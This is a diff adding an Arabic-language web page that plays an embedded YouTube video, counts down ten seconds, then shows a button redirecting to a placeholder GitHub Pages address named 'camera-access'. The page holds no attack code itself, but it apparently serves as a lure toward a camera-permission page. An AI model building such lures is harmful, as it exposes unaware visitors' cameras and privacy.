@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>متابعة</title>
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f9f9f9;
+    text-align: center;
+    padding-top: 30px;
+  }
+
+  #container {
+    background: white;
+    width: 360px;
+    margin: auto;
+    padding: 15px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+
+  #btn {
+    display: none;
+    margin-top: 15px;
+    padding: 15px;
+    width: 100%;
+    font-size: 18px;
+    background: #cc0000;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+
+  #timer {
+    margin-top: 10px;
+    font-size: 16px;
+    color: #555;
+  }
+</style>
+</head>
+
+<body>
+
+<div id="container">
+  <h3>شاهد الفيديو ثم تابع</h3>
+
+  <!-- واجهة يوتيوب -->
+  <iframe width="330" height="185"
+    src="https://www.youtube.com/embed/ueUh3PzJgkY?rel=0"
+    frameborder="0"
+    allowfullscreen>
+  </iframe>
+
+  <div id="timer">المرجو الانتظار 10 ثواني...</div>
+
+  <button id="btn" onclick="go()">متابعة</button>
+</div>
+
+<script>
+  let time = 10;
+  const timer = document.getElementById("timer");
+  const btn = document.getElementById("btn");
+
+  const countdown = setInterval(() => {
+    time--;
+    timer.innerText = "المرجو الانتظار " + time + " ثواني...";
+
+    if (time <= 0) {
+      clearInterval(countdown);
+      timer.style.display = "none";
+      btn.style.display = "block";
+    }
+  }, 1000);
+
+  function go() {
+    window.location.href = "https://username.github.io/camera-access/";
+  }
+</script>
+
+</body>
+</html>
